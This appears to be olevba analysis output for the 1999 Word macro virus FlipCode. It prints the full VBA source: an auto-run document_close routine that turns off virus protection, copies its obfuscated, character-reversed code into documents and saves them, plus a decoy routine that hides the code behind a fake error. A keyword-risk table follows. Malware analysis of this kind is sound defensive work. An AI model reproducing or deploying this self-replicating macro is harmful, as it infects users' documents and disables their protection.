olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.FlipCode-c843ac33eb9f8478495b00f48e39e455c71e8525
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.FlipCode-c843ac33eb9f8478495b00f48e39e455c71e8525 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub document_close() ' buS dnE :valay
On Error Resume Next 'flipcode v1.0 mae 1999'
Options.VirusProtection = False ' val txeN
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines > 0 Then ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines ' $she ,1 seniLtresnI.eludoMedoC.)1(metI.stnenopmoCBV.tcejorPBV.etalpmeTlamroN
For lag = 1 To 14 ' maur txeN
nav$ = "" ' $she & )1 ,maur ,))1 ,val(senil.eludoMedoC.)1(metI.stnenopmoCBV.tcejorPBV.tnemucoDevitcA(($diM = $she
For aynat = Len(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.lines(lag, 1)) To 1 Step -1 ' ))1 ,val(senil.eludoMedoC.)1(metI.stnenopmoCBV.tcejorPBV.tnemucoDevitcA(neL oT 1 = maur roF
nav$ = nav$ & Mid$((NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.lines(lag, 1)), aynat, 1) ' "" = $she
Next aynat ' 41 oT 1 = val roF
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, nav$ ' seniLfOtnuoC.eludoMedoC.)1(metI.stnenopmoCBV.tcejorPBV.etalpmeTlamroN ,1 senileteled.eludoMedoC.)1(metI.stnenopmoCBV.tcejorPBV.etalpmeTlamroN nehT 0 > seniLfOtnuoC.eludoMedoC.)1(metI.stnenopmoCBV.tcejorPBV.etalpmeTlamroN fI
Next lag ' 0 = noitcetorPsuriV.snoitpO
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName ' valay oToG rorrE nO
End Sub ' eslaF = rotidEcisaBlausiVwohS.noitacilppA
Private Sub viewvbcode(): MsgBox "The Visual Basic environment could not be initialized. Please run setup to install it correctly.", vbCritical: End Sub ' )(nepo_tnemucod buS etavirP
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_close      |Runs when the Word document is closed        |
|Suspicious|environment         |May read system environment variables        |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

